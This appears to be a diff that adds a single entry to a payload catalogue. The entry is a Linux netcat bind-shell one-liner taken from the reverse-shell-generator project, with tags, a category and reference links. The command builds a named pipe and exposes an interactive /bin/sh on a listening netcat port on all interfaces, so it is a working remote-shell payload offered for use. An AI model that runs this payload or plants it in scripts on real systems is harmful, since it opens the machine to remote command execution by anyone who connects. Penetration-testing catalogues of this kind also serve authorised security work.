@@ -1,0 +1,30 @@
+{
+  "id": "rsg-bindshell-nc-mkfifo-bind",
+  "name": "RSG · BindShell · nc mkfifo Bind",
+  "command": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 <lport> > /tmp/f",
+  "description": "Bind Shell payload — nc mkfifo Bind (via reverse-shell-generator).",
+  "platform": "linux",
+  "tags": [
+    "rsg",
+    "payload",
+    "bind-shell",
+    "bind",
+    "mac",
+    "linux"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "BindShell/nc mkfifo Bind/76",
+  "category": "payloads",
+  "subcategory": "bind-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
